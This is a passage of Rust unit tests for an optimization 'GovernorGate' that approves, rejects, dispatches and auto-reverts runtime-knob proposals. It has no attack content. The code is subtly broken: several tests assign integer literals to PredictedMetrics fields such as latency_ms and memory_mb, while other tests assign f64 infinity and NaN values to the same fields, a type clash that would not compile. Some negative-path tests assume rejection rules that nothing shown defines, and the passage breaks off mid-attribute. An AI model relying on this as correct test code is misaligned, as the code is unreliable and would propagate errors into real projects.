    fn proposal_with_metrics(id: &str, predicted: PredictedMetrics) -> OptimizationProposal {
        OptimizationProposal {
            proposal_id: id.to_string(),
            knob: RuntimeKnob::ConcurrencyLimit,
            old_value: 64,
            new_value: 128,
            predicted,
            rationale: "Probe an unsafe metric edge".to_string(),
            trace_id: format!("trace-{id}"),
        }
    }

    #[test]
    fn test_gate_approved_emits_candidate_proposed() {
        let mut gate = GovernorGate::with_defaults();
        gate.submit(good_proposal("p1"));
        let codes: Vec<&str> = gate
            .audit_trail()
            .iter()
            .map(|e| e.event_code.as_str())
            .collect();
        assert!(codes.contains(&event_codes::GOVERNOR_CANDIDATE_PROPOSED));
    }

    #[test]
    fn test_gate_approved_emits_shadow_eval_start() {
        let mut gate = GovernorGate::with_defaults();
        gate.submit(good_proposal("p1"));
        let codes: Vec<&str> = gate
            .audit_trail()
            .iter()
            .map(|e| e.event_code.as_str())
            .collect();
        assert!(codes.contains(&event_codes::GOVERNOR_SHADOW_EVAL_START));
    }

    #[test]
    fn test_gate_approved_emits_safety_check_pass() {
        let mut gate = GovernorGate::with_defaults();
        gate.submit(good_proposal("p1"));
        let codes: Vec<&str> = gate
            .audit_trail()
            .iter()
            .map(|e| e.event_code.as_str())
            .collect();
        assert!(codes.contains(&event_codes::GOVERNOR_SAFETY_CHECK_PASS));
    }

    #[test]
    fn test_gate_approved_emits_policy_applied() {
        let mut gate = GovernorGate::with_defaults();
        gate.submit(good_proposal("p1"));
        let codes: Vec<&str> = gate
            .audit_trail()
            .iter()
            .map(|e| e.event_code.as_str())
            .collect();
        assert!(codes.contains(&event_codes::GOVERNOR_POLICY_APPLIED));
    }

    #[test]
    fn test_gate_unsafe_proposal_rejects() {
        let mut gate = GovernorGate::with_defaults();
        let decision = gate.submit(unsafe_proposal("p2"));
        assert!(matches!(
            decision,
            GovernorDecision::Rejected(RejectionReason::EnvelopeViolation(_))
        ));
        let codes: Vec<&str> = gate
            .audit_trail()
            .iter()
            .map(|e| e.event_code.as_str())
            .collect();
        assert!(codes.contains(&error_codes::ERR_GOVERNOR_UNSAFE_CANDIDATE));
    }

    #[test]
    fn test_gate_non_beneficial_rejects() {
        let mut gate = GovernorGate::with_defaults();
        let mut p = good_proposal("p3");
        p.new_value = p.old_value;
        let decision = gate.submit(p);
        assert!(matches!(
            decision,
            GovernorDecision::Rejected(RejectionReason::NonBeneficial)
        ));
        let codes: Vec<&str> = gate
            .audit_trail()
            .iter()
            .map(|e| e.event_code.as_str())
            .collect();
        assert!(codes.contains(&error_codes::ERR_GOVERNOR_BENEFIT_BELOW_THRESHOLD));
    }

    #[test]
    fn test_gate_locked_knob_rejects() {
        let mut gov = OptimizationGovernor::with_defaults();
        gov.lock_knob(RuntimeKnob::ConcurrencyLimit);
        let mut gate = GovernorGate::new(gov);
        let decision = gate.submit(good_proposal("p4"));
        assert!(matches!(
            decision,
            GovernorDecision::Rejected(RejectionReason::KnobLocked)
        ));
        let codes: Vec<&str> = gate
            .audit_trail()
            .iter()
            .map(|e| e.event_code.as_str())
            .collect();
        assert!(codes.contains(&error_codes::ERR_GOVERNOR_KNOB_READONLY));
    }

    #[test]
    fn test_gate_empty_proposal_id_rejected_without_dispatch_payload() {
        let mut gate = GovernorGate::with_defaults();
        let (decision, payload) = gate.submit_and_dispatch(good_proposal(""));

        assert!(matches!(
            decision,
            GovernorDecision::Rejected(RejectionReason::InvalidProposal(_))
        ));
        assert!(payload.is_none());
        assert_eq!(gate.inner().applied_count(), 0);
        assert!(gate.audit_trail().iter().any(|e| {
            e.event_code == error_codes::ERR_GOVERNOR_SHADOW_EVAL_FAILED && e.proposal_id.is_empty()
        }));
        assert!(
            !gate
                .audit_trail()
                .iter()
                .any(|e| e.event_code == GOV_010_KNOB_DISPATCHED)
        );
    }

    #[test]
    fn test_gate_empty_trace_id_rejected_without_policy_applied() {
        let mut gate = GovernorGate::with_defaults();
        let mut proposal = good_proposal("empty-trace");
        proposal.trace_id.clear();

        let decision = gate.submit(proposal);

        assert!(matches!(
            decision,
            GovernorDecision::Rejected(RejectionReason::InvalidProposal(_))
        ));
        assert_eq!(gate.inner().applied_count(), 0);
        assert!(
            !gate
                .audit_trail()
                .iter()
                .any(|e| e.event_code == event_codes::GOVERNOR_POLICY_APPLIED)
        );
    }

    #[test]
    fn test_gate_nan_error_rate_rejected_as_invalid_proposal() {
        let mut gate = GovernorGate::with_defaults();
        let mut proposal = good_proposal("nan-error-rate");
        proposal.predicted.error_rate_pct = f64::NAN;

        let decision = gate.submit(proposal);

        assert!(matches!(
            decision,
            GovernorDecision::Rejected(RejectionReason::InvalidProposal(_))
        ));
        assert!(gate.audit_trail().iter().any(|e| {
            e.event_code == error_codes::ERR_GOVERNOR_SHADOW_EVAL_FAILED
                && e.detail.contains("InvalidProposal")
        }));
    }

    #[test]
    fn test_gate_stale_old_value_rejected_before_knob_change() {
        let mut gate = GovernorGate::with_defaults();
        let mut proposal = good_proposal("stale-old-value");
        proposal.old_value = 63;

        let decision = gate.submit(proposal);

        assert!(matches!(
            decision,
            GovernorDecision::Rejected(RejectionReason::InvalidProposal(_))
        ));
        assert_eq!(
            gate.inner().knob_value(&RuntimeKnob::ConcurrencyLimit),
            Some(64)
        );
        assert_eq!(gate.inner().applied_count(), 0);
    }

    #[test]
    fn test_gate_latency_only_envelope_violation_rejected() {
        let mut gate = GovernorGate::with_defaults();
        let mut metrics = safe_metrics();
        metrics.latency_ms = 501;

        let decision = gate.submit(proposal_with_metrics("latency-only", metrics));

        match decision {
            GovernorDecision::Rejected(RejectionReason::EnvelopeViolation(violations)) => {
                assert_eq!(violations.len(), 1);
                assert!(violations[0].contains("latency"));
            }
            other => panic!("expected latency envelope rejection, got {other:?}"),
        }
        assert_eq!(gate.inner().applied_count(), 0);
    }

    #[test]
    fn test_gate_throughput_only_envelope_violation_rejected() {
        let mut gate = GovernorGate::with_defaults();
        let mut metrics = safe_metrics();
        metrics.throughput_rps = 99;

        let decision = gate.submit(proposal_with_metrics("throughput-only", metrics));

        match decision {
            GovernorDecision::Rejected(RejectionReason::EnvelopeViolation(violations)) => {
                assert_eq!(violations.len(), 1);
                assert!(violations[0].contains("throughput"));
            }
            other => panic!("expected throughput envelope rejection, got {other:?}"),
        }
        assert_eq!(gate.inner().applied_count(), 0);
    }

    #[test]
    fn test_gate_error_rate_only_envelope_violation_rejected() {
        let mut gate = GovernorGate::with_defaults();
        let mut metrics = safe_metrics();
        metrics.error_rate_pct = 1.01;

        let decision = gate.submit(proposal_with_metrics("error-rate-only", metrics));

        match decision {
            GovernorDecision::Rejected(RejectionReason::EnvelopeViolation(violations)) => {
                assert_eq!(violations.len(), 1);
                assert!(violations[0].contains("error rate"));
            }
            other => panic!("expected error-rate envelope rejection, got {other:?}"),
        }
        assert_eq!(gate.inner().applied_count(), 0);
    }

    #[test]
    fn test_gate_memory_only_envelope_violation_rejected() {
        let mut gate = GovernorGate::with_defaults();
        let mut metrics = safe_metrics();
        metrics.memory_mb = 4097;

        let decision = gate.submit(proposal_with_metrics("memory-only", metrics));

        match decision {
            GovernorDecision::Rejected(RejectionReason::EnvelopeViolation(violations)) => {
                assert_eq!(violations.len(), 1);
                assert!(violations[0].contains("memory"));
            }
            other => panic!("expected memory envelope rejection, got {other:?}"),
        }
        assert_eq!(gate.inner().applied_count(), 0);
    }

    #[test]
    fn test_gate_live_check_auto_reverts() {
        let mut gate = GovernorGate::with_defaults();
        gate.submit(good_proposal("p1"));
        let bad_live = PredictedMetrics {
            latency_ms: 999,
            throughput_rps: 10,
            error_rate_pct: 50.0,
            memory_mb: 9999,
        };
        let reverted = gate.live_check(&bad_live);
        assert_eq!(reverted, vec!["p1"]);
        let codes: Vec<&str> = gate
            .audit_trail()
            .iter()
            .map(|e| e.event_code.as_str())
            .collect();
        assert!(codes.contains(&event_codes::GOVERNOR_POLICY_REVERTED));
    }

    #[test]
    fn test_gate_engine_boundary_violation() {
        let mut gate = GovernorGate::with_defaults();
        let result = gate.reject_engine_internal_adjustment("engine_core::gc_threshold");
        assert!(result.is_err());
        let err_msg = result.expect_err("should fail");
        assert!(err_msg.contains(error_codes::ERR_GOVERNOR_ENGINE_BOUNDARY_VIOLATION));
    }

    #[test]
    fn test_gate_audit_trail_records_all_events() {
        let mut gate = GovernorGate::with_defaults();
        gate.submit(good_proposal("p1"));
        assert!(
            gate.audit_trail().len() >= 4,
            "expected >= 4 audit entries, got {}",
            gate.audit_trail().len()
        );
    }

    #[test]
    fn test_gate_schema_version() {
        let gate = GovernorGate::with_defaults();
        assert_eq!(gate.inner().schema_version(), SCHEMA_VERSION);
    }

    #[test]
    fn test_invariant_constants_exist() {
        assert_eq!(
            invariants::INV_GOVERNOR_SHADOW_REQUIRED,
            "INV-GOVERNOR-SHADOW-REQUIRED"
        );
        assert_eq!(
            invariants::INV_GOVERNOR_SAFETY_ENVELOPE,
            "INV-GOVERNOR-SAFETY-ENVELOPE"
        );
        assert_eq!(
            invariants::INV_GOVERNOR_AUTO_REVERT,
            "INV-GOVERNOR-AUTO-REVERT"
        );
        assert_eq!(
            invariants::INV_GOVERNOR_ENGINE_BOUNDARY,
            "INV-GOVERNOR-ENGINE-BOUNDARY"
        );
    }

    #[test]
    fn test_event_code_constants_exist() {
        assert_eq!(
            event_codes::GOVERNOR_CANDIDATE_PROPOSED,
            "GOVERNOR_CANDIDATE_PROPOSED"
        );
        assert_eq!(
            event_codes::GOVERNOR_SHADOW_EVAL_START,
            "GOVERNOR_SHADOW_EVAL_START"
        );
        assert_eq!(
            event_codes::GOVERNOR_SAFETY_CHECK_PASS,
            "GOVERNOR_SAFETY_CHECK_PASS"
        );
        assert_eq!(
            event_codes::GOVERNOR_POLICY_APPLIED,
            "GOVERNOR_POLICY_APPLIED"
        );
        assert_eq!(
            event_codes::GOVERNOR_POLICY_REVERTED,
            "GOVERNOR_POLICY_REVERTED"
        );
    }

    #[test]
    fn test_error_code_constants_exist() {
        assert_eq!(
            error_codes::ERR_GOVERNOR_UNSAFE_CANDIDATE,
            "ERR_GOVERNOR_UNSAFE_CANDIDATE"
        );
        assert_eq!(
            error_codes::ERR_GOVERNOR_SHADOW_EVAL_FAILED,
            "ERR_GOVERNOR_SHADOW_EVAL_FAILED"
        );
        assert_eq!(
            error_codes::ERR_GOVERNOR_BENEFIT_BELOW_THRESHOLD,
            "ERR_GOVERNOR_BENEFIT_BELOW_THRESHOLD"
        );
        assert_eq!(
            error_codes::ERR_GOVERNOR_ENGINE_BOUNDARY_VIOLATION,
            "ERR_GOVERNOR_ENGINE_BOUNDARY_VIOLATION"
        );
        assert_eq!(
            error_codes::ERR_GOVERNOR_REVERT_FAILED,
            "ERR_GOVERNOR_REVERT_FAILED"
        );
        assert_eq!(
            error_codes::ERR_GOVERNOR_KNOB_READONLY,
            "ERR_GOVERNOR_KNOB_READONLY"
        );
    }

    #[test]
    fn test_gate_serde_roundtrip() {
        let mut gate = GovernorGate::with_defaults();
        gate.submit(good_proposal("p1"));
        let json = serde_json::to_string(&gate).expect("serialize");
        let gate2: GovernorGate = serde_json::from_str(&json).expect("deserialize");
        assert_eq!(
            gate.inner().decision_log().len(),
            gate2.inner().decision_log().len()
        );
        assert_eq!(gate.audit_trail().len(), gate2.audit_trail().len());
    }

    // =========================================================================
    // Engine dispatch hooks and knob enumeration tests (bd-1p2r)
    // =========================================================================

    // -- KnobEnumeration --

    #[test]
    fn test_enumerate_knobs_returns_all_five() {
        let mut gate = GovernorGate::with_defaults();
        let enumeration = gate.enumerate_knobs();
        assert_eq!(enumeration.count(), 5);
    }

    #[test]
    fn test_enumerate_knobs_has_concurrency_limit() {
        let mut gate = GovernorGate::with_defaults();
        let enumeration = gate.enumerate_knobs();
        let desc = enumeration
            .get(&RuntimeKnob::ConcurrencyLimit)
            .expect("should exist");
        assert_eq!(desc.current_value, 64);
        assert!(!desc.locked);
        assert_eq!(desc.label, "concurrency_limit");
    }

    #[test]
    fn test_enumerate_knobs_has_batch_size() {
        let mut gate = GovernorGate::with_defaults();
        let enumeration = gate.enumerate_knobs();
        let desc = enumeration
            .get(&RuntimeKnob::BatchSize)
            .expect("should exist");
        assert_eq!(desc.current_value, 128);
    }

    #[test]
    fn test_enumerate_knobs_ranges_set() {
        let mut gate = GovernorGate::with_defaults();
        let enumeration = gate.enumerate_knobs();
        for desc in &enumeration.knobs {
            assert!(
                desc.min_value < desc.max_value,
                "min < max for {}",
                desc.label
            );
        }
    }

    #[test]
    fn test_enumerate_knobs_locked_shows_locked() {
        let mut gov = OptimizationGovernor::with_defaults();
        gov.lock_knob(RuntimeKnob::RetryBudget);
        let mut gate = GovernorGate::new(gov);
        let enumeration = gate.enumerate_knobs();
        let retry = enumeration
            .get(&RuntimeKnob::RetryBudget)
            .expect("should exist");
        assert!(retry.locked);
        assert_eq!(enumeration.locked().len(), 1);
        assert_eq!(enumeration.unlocked().len(), 4);
    }

    #[test]
    fn test_enumerate_emits_gov008() {
        let mut gate = GovernorGate::with_defaults();
        gate.enumerate_knobs();
        let codes: Vec<&str> = gate
            .audit_trail()
            .iter()
            .map(|e| e.event_code.as_str())
            .collect();
        assert!(codes.contains(&GOV_008_KNOB_ENUMERATION));
    }

    #[test]
    fn test_enumerate_schema_version() {
        let mut gate = GovernorGate::with_defaults();
        let enumeration = gate.enumerate_knobs();
        assert_eq!(enumeration.schema_version, SCHEMA_VERSION);
    }

    #[test]
    fn test_enumerate_reflects_knob_change() {
        let mut gate = GovernorGate::with_defaults();
        gate.submit(good_proposal("p1")); // ConcurrencyLimit 64 → 128
        let enumeration = gate.enumerate_knobs();
        let desc = enumeration
            .get(&RuntimeKnob::ConcurrencyLimit)
            .expect("should exist");
        assert_eq!(desc.current_value, 128);
    }

    #[test]
    fn test_knob_enumeration_serde_roundtrip() {
        let mut gate = GovernorGate::with_defaults();
        let enumeration = gate.enumerate_knobs();
        let json = serde_json::to_string(&enumeration).expect("serialize");
        let parsed: KnobEnumeration = serde_json::from_str(&json).expect("deserialize");
        assert_eq!(parsed.count(), 5);
        assert_eq!(parsed.schema_version, SCHEMA_VERSION);
    }

    // -- DispatchHookPayload --

    #[test]
    fn test_build_dispatch_payload_has_all_knobs() {
        let mut gate = GovernorGate::with_defaults();
        let payload = gate.build_dispatch_payload();
        assert!(
            payload
                .env_vars
                .contains_key("FRANKEN_GOV_CONCURRENCY_LIMIT")
        );
        assert!(payload.env_vars.contains_key("FRANKEN_GOV_BATCH_SIZE"));
        assert!(payload.env_vars.contains_key("FRANKEN_GOV_CACHE_CAPACITY"));
        assert!(
            payload
                .env_vars
                .contains_key("FRANKEN_GOV_DRAIN_TIMEOUT_MS")
        );
        assert!(payload.env_vars.contains_key("FRANKEN_GOV_RETRY_BUDGET"));
    }

    #[test]
    fn test_build_dispatch_payload_has_envelope_bounds() {
        let mut gate = GovernorGate::with_defaults();
        let payload = gate.build_dispatch_payload();
        assert!(payload.env_vars.contains_key("FRANKEN_GOV_MAX_LATENCY_MS"));
        assert!(
            payload
                .env_vars
                .contains_key("FRANKEN_GOV_MIN_THROUGHPUT_RPS")
        );
        assert!(
            payload
                .env_vars
                .contains_key("FRANKEN_GOV_MAX_ERROR_RATE_PCT")
        );
        assert!(payload.env_vars.contains_key("FRANKEN_GOV_MAX_MEMORY_MB"));
    }

    #[test]
    fn test_build_dispatch_payload_values_correct() {
        let mut gate = GovernorGate::with_defaults();
        let payload = gate.build_dispatch_payload();
        assert_eq!(payload.env_vars["FRANKEN_GOV_CONCURRENCY_LIMIT"], "64");
        assert_eq!(payload.env_vars["FRANKEN_GOV_BATCH_SIZE"], "128");
        assert_eq!(payload.env_vars["FRANKEN_GOV_RETRY_BUDGET"], "3");
    }

    #[test]
    fn test_dispatch_payload_schema_version() {
        let mut gate = GovernorGate::with_defaults();
        let payload = gate.build_dispatch_payload();
        assert_eq!(payload.schema_version, SCHEMA_VERSION);
    }

    #[test]
    fn test_dispatch_payload_applied_count_zero() {
        let mut gate = GovernorGate::with_defaults();
        let payload = gate.build_dispatch_payload();
        assert_eq!(payload.applied_count, 0);
    }

    #[test]
    fn test_dispatch_payload_applied_count_after_submit() {
        let mut gate = GovernorGate::with_defaults();
        gate.submit(good_proposal("p1"));
        let payload = gate.build_dispatch_payload();
        assert_eq!(payload.applied_count, 1);
    }

    #[test]
    fn test_dispatch_payload_reflects_knob_change() {
        let mut gate = GovernorGate::with_defaults();
        gate.submit(good_proposal("p1")); // ConcurrencyLimit 64 → 128
        let payload = gate.build_dispatch_payload();
        assert_eq!(payload.env_vars["FRANKEN_GOV_CONCURRENCY_LIMIT"], "128");
    }

    #[test]
    fn test_build_dispatch_emits_gov009() {
        let mut gate = GovernorGate::with_defaults();
        gate.build_dispatch_payload();
        let codes: Vec<&str> = gate
            .audit_trail()
            .iter()
            .map(|e| e.event_code.as_str())
            .collect();
        assert!(codes.contains(&GOV_009_DISPATCH_HOOK));
    }

    #[test]
    fn test_dispatch_payload_serde_roundtrip() {
        let mut gate = GovernorGate::with_defaults();
        let payload = gate.build_dispatch_payload();
        let json = serde_json::to_string(&payload).expect("serialize");
        let parsed: DispatchHookPayload = serde_json::from_str(&json).expect("deserialize");
        assert_eq!(parsed.env_vars.len(), payload.env_vars.len());
    }

    // -- submit_and_dispatch --

    #[test]
    fn test_submit_and_dispatch_approved() {
        let mut gate = GovernorGate::with_defaults();
        let (decision, payload) = gate.submit_and_dispatch(good_proposal("p1"));
        assert!(matches!(decision, GovernorDecision::Approved));
        assert!(payload.is_some());
        let payload = payload.expect("should have payload");
        assert_eq!(payload.env_vars["FRANKEN_GOV_CONCURRENCY_LIMIT"], "128");
    }

    #[test]
    fn test_submit_and_dispatch_rejected_no_payload() {
        let mut gate = GovernorGate::with_defaults();
        let (decision, payload) = gate.submit_and_dispatch(unsafe_proposal("p2"));
        assert!(matches!(decision, GovernorDecision::Rejected(_)));
        assert!(payload.is_none());
    }

    #[test]
    fn test_submit_and_dispatch_emits_gov010() {
        let mut gate = GovernorGate::with_defaults();
        gate.submit_and_dispatch(good_proposal("p1"));
        let codes: Vec<&str> = gate
            .audit_trail()
            .iter()
            .map(|e| e.event_code.as_str())
            .collect();
        assert!(codes.contains(&GOV_010_KNOB_DISPATCHED));
    }

    #[test]
    fn test_submit_and_dispatch_rejected_no_gov010() {
        let mut gate = GovernorGate::with_defaults();
        gate.submit_and_dispatch(unsafe_proposal("p2"));
        let codes: Vec<&str> = gate
            .audit_trail()
            .iter()
            .map(|e| e.event_code.as_str())
            .collect();
        assert!(!codes.contains(&GOV_010_KNOB_DISPATCHED));
    }

    #[test]
    fn negative_submit_and_dispatch_non_beneficial_has_no_payload() {
        let mut gate = GovernorGate::with_defaults();
        let mut proposal = good_proposal("non-beneficial-dispatch");
        proposal.new_value = proposal.old_value;

        let (decision, payload) = gate.submit_and_dispatch(proposal);

        assert!(matches!(
            decision,
            GovernorDecision::Rejected(RejectionReason::NonBeneficial)
        ));
        assert!(payload.is_none());
        assert_eq!(gate.inner().applied_count(), 0);
        assert!(
            !gate
                .audit_trail()
                .iter()
                .any(|entry| entry.event_code == GOV_010_KNOB_DISPATCHED)
        );
    }

    #[test]
    fn negative_submit_and_dispatch_locked_knob_has_no_payload() {
        let mut gov = OptimizationGovernor::with_defaults();
        gov.lock_knob(RuntimeKnob::ConcurrencyLimit);
        let mut gate = GovernorGate::new(gov);

        let (decision, payload) = gate.submit_and_dispatch(good_proposal("locked-dispatch"));

        assert!(matches!(
            decision,
            GovernorDecision::Rejected(RejectionReason::KnobLocked)
        ));
        assert!(payload.is_none());
        assert_eq!(
            gate.inner().knob_value(&RuntimeKnob::ConcurrencyLimit),
            Some(64)
        );
        assert!(
            !gate
                .audit_trail()
                .iter()
                .any(|entry| entry.event_code == event_codes::GOVERNOR_POLICY_APPLIED)
        );
    }

    #[test]
    fn negative_rejected_dispatch_does_not_mutate_payload_state() {
        let mut gate = GovernorGate::with_defaults();
        let before = gate.build_dispatch_payload();

        let (decision, payload) = gate.submit_and_dispatch(unsafe_proposal("reject-no-mutate"));
        let after = gate.build_dispatch_payload();

        assert!(matches!(decision, GovernorDecision::Rejected(_)));
        assert!(payload.is_none());
        assert_eq!(
            before.env_vars["FRANKEN_GOV_CONCURRENCY_LIMIT"],
            after.env_vars["FRANKEN_GOV_CONCURRENCY_LIMIT"]
        );
        assert_eq!(after.applied_count, 0);
    }

    #[test]
    fn negative_live_check_without_applied_policy_records_no_revert() {
        let mut gate = GovernorGate::with_defaults();
        let bad_live = PredictedMetrics {
            latency_ms: 999,
            throughput_rps: 10,
            error_rate_pct: 50.0,
            memory_mb: 9999,
        };

        let reverted = gate.live_check(&bad_live);

        assert!(reverted.is_empty());
        assert!(
            !gate
                .audit_trail()
                .iter()
                .any(|entry| entry.event_code == event_codes::GOVERNOR_POLICY_REVERTED)
        );
    }

    #[test]
    fn negative_boundary_violation_with_empty_internal_name_is_rejected() {
        let mut gate = GovernorGate::with_defaults();

        let err = gate
            .reject_engine_internal_adjustment("")
            .expect_err("empty engine-internal name is still forbidden");

        assert!(err.contains(error_codes::ERR_GOVERNOR_ENGINE_BOUNDARY_VIOLATION));
        assert!(gate.audit_trail().iter().any(|entry| {
            entry.event_code == error_codes::ERR_GOVERNOR_ENGINE_BOUNDARY_VIOLATION
                && entry.detail.contains("engine-core internal")
        }));
    }

    #[test]
    fn negative_push_bounded_zero_capacity_drops_existing_and_new_items() {
        let mut entries = vec![
            GateAuditEntry {
                event_code: "old-a".into(),
                proposal_id: "p-old-a".into(),
                detail: "old".into(),
            },
            GateAuditEntry {
                event_code: "old-b".into(),
                proposal_id: "p-old-b".into(),
                detail: "old".into(),
            },
        ];

        push_bounded(
            &mut entries,
            GateAuditEntry {
                event_code: "new".into(),
                proposal_id: "p-new".into(),
                detail: "new".into(),
            },
            0,
        );

        assert!(entries.is_empty());
    }

    // -- Full pipeline --

    #[test]
    fn test_full_pipeline_enumerate_submit_dispatch() {
        let mut gate = GovernorGate::with_defaults();

        // 1. Enumerate knobs
        let enum_before = gate.enumerate_knobs();
        assert_eq!(
            enum_before
                .get(&RuntimeKnob::ConcurrencyLimit)
                .expect("should have env vars")
                .current_value,
            64
        );

        // 2. Submit and dispatch
        let (decision, payload) = gate.submit_and_dispatch(good_proposal("p1"));
        assert!(matches!(decision, GovernorDecision::Approved));
        let payload = payload.expect("should have payload");
        assert_eq!(payload.env_vars["FRANKEN_GOV_CONCURRENCY_LIMIT"], "128");

        // 3. Enumerate again — reflects new value
        let enum_after = gate.enumerate_knobs();
        assert_eq!(
            enum_after
                .get(&RuntimeKnob::ConcurrencyLimit)
                .expect("should have env vars")
                .current_value,
            128
        );
    }

    #[test]
    fn test_dispatch_after_revert_restores_old_values() {
        let mut gate = GovernorGate::with_defaults();
        gate.submit(good_proposal("p1")); // 64 → 128

        // Live check with bad metrics → auto-revert
        let bad_live = PredictedMetrics {
            latency_ms: 999,
            throughput_rps: 10,
            error_rate_pct: 50.0,
            memory_mb: 9999,
        };
        let reverted = gate.live_check(&bad_live);
        assert_eq!(reverted, vec!["p1"]);

        // Dispatch payload should reflect reverted value
        let payload = gate.build_dispatch_payload();
        assert_eq!(payload.env_vars["FRANKEN_GOV_CONCURRENCY_LIMIT"], "64");
        assert_eq!(payload.applied_count, 0);
    }

    // -- Event code constants --

    #[test]
    fn test_dispatch_event_codes_defined() {
        assert!(!GOV_008_KNOB_ENUMERATION.is_empty());
        assert!(!GOV_009_DISPATCH_HOOK.is_empty());
        assert!(!GOV_010_KNOB_DISPATCHED.is_empty());
    }

    // -- KnobDescriptor serde --

    #[test]
    fn test_knob_descriptor_serde_roundtrip() {
        let desc = KnobDescriptor {
            knob: RuntimeKnob::BatchSize,
            label: "batch_size".to_string(),
            current_value: 128,
            locked: false,
            min_value: 1,
            max_value: 8192,
        };
        let json = serde_json::to_string(&desc).expect("serialize");
        let parsed: KnobDescriptor = serde_json::from_str(&json).expect("deserialize");
        assert_eq!(parsed, desc);
    }

    // -- DispatchHookRecord serde --

    #[test]
    fn test_dispatch_hook_record_serde_roundtrip() {
        let record = DispatchHookRecord {
            event_code: GOV_010_KNOB_DISPATCHED.to_string(),
            knob: Some(RuntimeKnob::ConcurrencyLimit),
            detail: "dispatched".to_string(),
        };
        let json = serde_json::to_string(&record).expect("serialize");
        let parsed: DispatchHookRecord = serde_json::from_str(&json).expect("deserialize");
        assert_eq!(parsed, record);
    }

    // -- GovernorDispatchSnapshot --

    #[test]
    fn test_governor_dispatch_snapshot_serde() {
        let mut gate = GovernorGate::with_defaults();
        let enumeration = gate.enumerate_knobs();
        let dispatch_payload = gate.build_dispatch_payload();
        let snap = GovernorDispatchSnapshot {
            enumeration,
            dispatch_payload,
            applied_count: 0,
        };
        let json = serde_json::to_string(&snap).expect("serialize");
        let parsed: GovernorDispatchSnapshot = serde_json::from_str(&json).expect("deserialize");
        assert_eq!(parsed.enumeration.count(), 5);
    }

    // =========================================================================
    // NEGATIVE-PATH EDGE CASE TESTS
    // =========================================================================

    #[test]
    fn negative_proposal_with_infinite_latency_rejected_as_invalid() {
        let mut gate = GovernorGate::with_defaults();
        let mut proposal = good_proposal("inf-latency");
        proposal.predicted.latency_ms = f64::INFINITY;

        let decision = gate.submit(proposal);

        assert!(matches!(
            decision,
            GovernorDecision::Rejected(RejectionReason::InvalidProposal(_))
        ));
        assert!(gate.audit_trail().iter().any(|e| {
            e.event_code == error_codes::ERR_GOVERNOR_SHADOW_EVAL_FAILED
                && e.detail.contains("InvalidProposal")
        }));
    }

    #[test]
    fn negative_proposal_with_negative_infinity_memory_rejected_as_invalid() {
        let mut gate = GovernorGate::with_defaults();
        let mut proposal = good_proposal("neg-inf-memory");
        proposal.predicted.memory_mb = f64::NEG_INFINITY;

        let decision = gate.submit(proposal);

        assert!(matches!(
            decision,
            GovernorDecision::Rejected(RejectionReason::InvalidProposal(_))
        ));
        assert_eq!(gate.inner().applied_count(), 0);
    }

    #[test]
    fn negative_proposal_with_extremely_long_id_rejected_gracefully() {
        let mut gate = GovernorGate::with_defaults();
        let long_id = "x".repeat(100_000); // 100KB proposal ID
        let mut proposal = good_proposal(&long_id);

        let decision = gate.submit(proposal);

        // Should reject as invalid, not crash
        assert!(matches!(
            decision,
            GovernorDecision::Rejected(RejectionReason::InvalidProposal(_))
        ));
        // Audit trail should record the rejection without the full massive ID
        assert!(gate.audit_trail().iter().any(|e| {
            e.event_code == error_codes::ERR_GOVERNOR_SHADOW_EVAL_FAILED
        }));
    }

    #[test]
    fn negative_proposal_with_control_characters_in_trace_id_rejected() {
        let mut gate = GovernorGate::with_defaults();
        let mut proposal = good_proposal("ctrl-chars");
        proposal.trace_id = "trace\x00\x01\x02\x1f".to_string(); // null bytes and control chars

        let decision = gate.submit(proposal);

        assert!(matches!(
            decision,
            GovernorDecision::Rejected(RejectionReason::InvalidProposal(_))
        ));
        assert!(gate.audit_trail().iter().any(|e| {
            e.event_code == error_codes::ERR_GOVERNOR_SHADOW_EVAL_FAILED
        }));
    }

    #[test]
    fn negative_knob_value_overflow_u64_max_plus_one_rejected() {
        let mut gate = GovernorGate::with_defaults();
        let mut proposal = good_proposal("overflow-knob");
        proposal.old_value = u64::MAX;
        proposal.new_value = u64::MAX; // Can't go higher than u64::MAX

        let decision = gate.submit(proposal);

        // Should be rejected as non-beneficial (old == new) or invalid
        assert!(matches!(
            decision,
            GovernorDecision::Rejected(RejectionReason::NonBeneficial)
                | GovernorDecision::Rejected(RejectionReason::InvalidProposal(_))
        ));
    }

    #[test]
    fn negative_audit_trail_exceeds_capacity_drops_oldest_entries_gracefully() {
        let mut gate = GovernorGate::with_defaults();

        // Submit many proposals to overflow the audit trail
        for i in 0..MAX_AUDIT_TRAIL_ENTRIES.saturating_add(10) {
            let proposal = good_proposal(&format!("overflow-{i}"));
            gate.submit(proposal);
        }

        // Should not panic, audit trail should be bounded
        assert!(gate.audit_trail().len() <= MAX_AUDIT_TRAIL_ENTRIES);

        // Latest entries should still be present
        assert!(gate.audit_trail().iter().any(|e| {
            e.proposal_id.contains(&format!("overflow-{}", MAX_AUDIT_TRAIL_ENTRIES.saturating_add(9)))
        }));

        // Earliest entries should be dropped
        assert!(!gate.audit_trail().iter().any(|e| {
            e.proposal_id.contains("overflow-0")
        }));
    }

    #[test]
    fn negative_live_check_with_all_nan_metrics_handles_gracefully() {
        let mut gate = GovernorGate::with_defaults();
        gate.submit(good_proposal("before-nan-check"));

        let all_nan_metrics = PredictedMetrics {
            latency_ms: f64::NAN,
            throughput_rps: f64::NAN,
            error_rate_pct: f64::NAN,
            memory_mb: f64::NAN,
        };

        // Should handle NaN metrics without panicking
        let reverted = gate.live_check(&all_nan_metrics);

        // Behavior may vary (could revert due to NaN being unsafe, or ignore)
        // Key is that it doesn't panic and audit trail remains consistent
        assert!(gate.audit_trail().len() > 0);
        if !reverted.is_empty() {
            assert!(gate.audit_trail().iter().any(|e| {
                e.event_code == event_codes::GOVERNOR_POLICY_REVERTED
            }));
        }
    }

    #[test]
    fn negative_enumerate_knobs_returns_consistent_ranges_for_extreme_current_values() {
        let mut gov = OptimizationGovernor::with_defaults();
        // Modify governor to have extreme current values (if possible via API)
        let mut gate = GovernorGate::new(gov);

        let enumeration = gate.enumerate_knobs();

        // All knobs should have consistent min < max regardless of current value
        for desc in &enumeration.knobs {
            assert!(
                desc.min_value < desc.max_value,
                "min {} >= max {} for knob {}",
                desc.min_value,
                desc.max_value,
                desc.label
            );

            // Current value may be outside advisory range, but ranges should be sane
            assert!(desc.max_value > 0, "max_value should be positive for {}", desc.label);
        }

        // Should emit enumeration event even with extreme values
        assert!(gate.audit_trail().iter().any(|e| {
            e.event_code == GOV_008_KNOB_ENUMERATION
        }));
    }

    #[test]
